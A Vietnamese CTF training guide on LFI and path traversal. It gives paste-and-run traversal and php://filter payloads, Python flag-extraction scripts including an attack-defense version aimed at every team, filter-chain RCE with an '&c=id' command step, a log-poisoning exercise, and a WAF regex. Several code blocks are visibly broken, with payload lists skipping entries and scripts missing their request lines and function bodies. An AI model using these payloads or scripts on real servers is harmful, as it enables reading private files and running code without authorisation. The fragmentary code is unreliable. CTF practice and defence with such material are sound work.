LFI / Path Traversal

Khi một trang web nhận tên file từ bạn (để hiển thị ảnh, đọc trang con, xem log...) và dùng nguyên văn để mở file trên server — bạn có thể đổi tên file đó để "đi lên" ra khỏi thư mục dự định, đọc được bất kỳ file nào trên máy chủ, và với PHP, nhiều khi biến thành chạy code tùy ý (RCE).

LFI/Path Traversal là gì, để làm gì?

Trang web có chức năng kiểu ?page=about.php hay ?file=report.pdf — server lấy tên file bạn đưa, ghép vào một thư mục cố định, rồi mở file đó ra đọc/hiển thị. Nếu bạn đổi tên file thành ../../../../etc/passwd, và server không kiểm tra, nó sẽ "đi lùi" ra khỏi thư mục dự định và mở đúng file hệ thống đó — Path Traversal. Khi chức năng đó không chỉ đọc mà còn chạy file (PHP include) thì gọi là LFI (Local File Inclusion) — và có thể leo thang thành chạy code tùy ý.

Nếu chỉ nhớ một điều Chuỗi ../ ("lên 1 cấp thư mục") là chìa khóa. Lặp lại đủ nhiều lần (../../../../../../etc/passwd) là bạn chắc chắn ra tới thư mục gốc /, dù không biết chính xác file đang ở sâu bao nhiêu cấp — thừa vẫn không sao, hệ thống chỉ dừng ở gốc.
⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay
⚡ LFI / PATH TRAVERSAL
🚩 Nhận ra trong 30 giây URL có tham số chứa tên file/đường dẫn: ?page=, ?file=, ?lang=, ?template=, ?download=. Thử đổi thành ../../../../etc/passwd → nếu Response hiện nội dung kiểu root:x:0:0:root:/root:/bin/bash ⟹ chắc chắn trúng.
✅ Tiền đề cần có Tham số đi thẳng vào hàm đọc/include file (không bị ép danh sách file cho phép — whitelist).
🔍 Dò nhanh bằng Burp Repeater, tăng dần số ../ (2, 4, 6, 8...) cho tới khi đọc được /etc/passwd — không cần biết chính xác độ sâu, thừa ../ vẫn an toàn (dừng ở /).
💥 Payload dán-chạy-ngay 
# 1. Đọc file hệ thống cơ bản (Linux)

# 4. Encode nếu bị lọc dấu / hoặc .:
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
🐍 Script khai thác (điền host, chạy) 
import re, requests

        params={"page": "../../../../../../flag.txt"}).text
print(re.search(r"FHACKER2026\{[0-9a-f]{64}\}", html).group())

Tìm được source nhưng không chạy được lệnh → xem mục 07 (filter chain RCE). WAF rule nhanh: chặn regex \.\./|%2e%2e%2f|php://filter. Chưa hiểu các bước? đọc tiếp dưới.
01 / NỀN TẢNG BẮT BUỘC

Những thứ cần hiểu trước

Đường dẫn file (path) — địa chỉ của 1 file trên ổ đĩa, ví dụ /var/www/html/pages/about.php. Dấu / ngăn cách các thư mục lồng nhau.
Path Traversal ("đi lùi thư mục") — chuỗi .. trong đường dẫn nghĩa là "lùi lại 1 cấp thư mục cha". Ví dụ đang ở /var/www/html/pages/, viết ../../../etc/passwd nghĩa là: lùi 3 cấp (ra /var/www/html → /var/www → /var → ra hẳn gốc /), rồi đi vào etc/passwd.
LFI (Local File Inclusion) — khi chức năng không chỉ đọc nội dung file để hiển thị, mà include (nạp và CHẠY) file đó như code — đặc trưng của PHP (include, require). Nếu bạn khiến nó include một file có code PHP do bạn kiểm soát (dù chỉ 1 phần), bạn có thể đạt RCE.

Ví dụ: trang có nhiều trang con (about, contact...), code hay viết kiểu:

// PHP
$page = $_GET['page'];
include("pages/" . $page);

Lập trình viên định: ?page=about.php → include pages/about.php. Nhưng $page được ghép thẳng, không kiểm tra, không giới hạn trong thư mục pages/.

02 / VÌ SAO LỖ HỔNG TỒN TẠI

Hệ điều hành hiểu .. là lệnh, không phải tên file

Khi bạn gửi page=../../../../etc/passwd, server ghép ra:

include("pages/../../../../etc/passwd");

Với PHP/hệ điều hành, pages/../../../../etc/passwd được tính toán từng bước: bắt đầu từ thư mục hiện tại, vào pages/, rồi .. lùi ra lại chỗ cũ, rồi tiếp tục lùi thêm nhiều cấp nữa cho tới gốc /, rồi đi vào etc/passwd. Hệ thống không hề biết đoạn pages/ ban đầu là "thư mục dự định", nó chỉ thấy một chuỗi đường dẫn hợp lệ và đi theo đúng chuỗi đó.

Giống hệt bản chất của SQLi/Command Injection: dữ liệu người dùng được diễn giải thành cú pháp (ở đây là cú pháp đường dẫn) thay vì chỉ là một chuỗi tên file vô hại.

03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI

Từ đọc file tới RCE qua PHP wrapper

Điểm quan trọng nhất của LFI trên PHP là PHP stream wrapper — PHP cho phép include()/require() nhận không chỉ đường dẫn file thường, mà cả các "giao thức" đặc biệt bắt đầu bằng php://, data://, zip://...

php://filter/convert.base64-encode/resource=index.php
php://filter — một luồng đặc biệt cho phép áp "bộ lọc" (filter) lên nội dung file trước khi trả về, thay vì chạy file đó như code.
convert.base64-encode — bộ lọc: mã hóa nội dung file thành Base64 trước khi đưa cho include(). Vì sao cần? Nếu bạn include trực tiếp 1 file .php, PHP sẽ chạy code trong đó (bạn không đọc được source, chỉ thấy kết quả chạy). Mã hóa base64 trước khiến PHP coi đó là text thường, không chạy được, nên bạn đọc được nguyên văn source code.
resource=index.php — file nguồn muốn đọc.
Response mong đợi: một chuỗi Base64 dài — tự giải mã (CyberChef, mục 07) ra được toàn bộ source code PHP của index.php, kể cả các dòng không hiện khi truy cập trực tiếp qua trình duyệt (vì PHP vốn chỉ trả về HTML đã chạy xong, không phải source).

Khi đã đọc được source, bạn thường tìm thấy đường đi khai thác tiếp (SQLi khác trong code, API key, hoặc đường dẫn upload để kết hợp LFI→RCE). Trường hợp đặc biệt mạnh hơn: dùng chuỗi filter chain (nhiều bộ lọc xếp chồng) để biến LFI trực tiếp thành RCE không cần upload file nào — xem công cụ ở mục 07.

php_filter_chain_generator — công cụ của Synacktiv: bạn chỉ cần đưa 1 đoạn code PHP muốn chạy, nó tự tính và in ra chuỗi php://filter/... dài ngoằng tương ứng — bạn không cần tự hiểu cách xếp convert.iconv.* để tạo ra đúng byte. Đã clone về ~/hoc/CTF/Tools/web/php_filter_chain_generator/.

Lệnh trên in ra một chuỗi php://filter/...resource=... rất dài — dán chuỗi đó làm giá trị tham số page của challenge. Nếu trúng, mỗi lần gọi lại URL kèm &c=id sẽ chạy lệnh id trên server.

Thành thật về giới hạnKỹ thuật filter chain phụ thuộc phiên bản PHP cụ thể và có thể tạo ra chuỗi payload rất dài (hàng nghìn ký tự) — một số app giới hạn độ dài URL/param sẽ chặn luôn cách này. Không phải "phép màu" dùng được ở mọi challenge LFI.

D. CyberChef — giải mã output base64/hex

Mở ~/hoc/CTF/Tools/web/CyberChef/CyberChef_v11.6.0.html. Dán chuỗi Base64 đọc được từ php://filter/convert.base64-encode (mục 03) vào Input, kéo khối From Base64 → đọc nguyên văn source code PHP ngay lập tức, không cần tự decode bằng tay/viết script.

(B) Bản gọn chắc — dùng thực chiến, trích thẳng flag

import re, requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")

def exploit_lfi(host):
    r = requests.get(f"http://{host}/view",
            params={"page": "../../../../../../flag.txt"}, timeout=5)
    m = FLAG_RE.search(r.text)
    return m.group() if m else None

print("FLAG:", exploit_lfi("TARGET_IP"))

(C) Bản A/D tái dùng — chạy mọi đội, mọi round

import re, requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")
PAYLOAD = "../../../../../../flag.txt"

def exploit_lfi(host):

        m = FLAG_RE.search(r.text)
        return m.group() if m else None
    except requests.RequestException:
        return None

if __name__ == "__main__":

⭐⭐⭐⭐ Tự nghĩ: đã đọc được source, thấy app log mọi request (bao gồm User-Agent) vào /var/log/app/access.log, và có LFI đọc được file bất kỳ. Viết các bước (không cần code) để đạt RCE qua log poisoning.

Gợi ý nếu kẹtGửi 1 request với header User-Agent chứa code PHP, sau đó LFI include chính file log đó — xem mục 06.C.

Thuật ngữ

Path TraversalDùng ../ để "đi lùi" ra khỏi thư mục dự định trong đường dẫn file.
LFI (Local File Inclusion)Khi path traversal xảy ra trong hàm include/require (chạy code) thay vì chỉ đọc nội dung.
PHP stream wrapperCú pháp giao_thức:// đặc biệt PHP hiểu được trong các hàm mở file, không chỉ đường dẫn thường.
Log poisoningKỹ thuật ghi code độc hại vào file log (qua header request), rồi include chính log đó để chạy code.
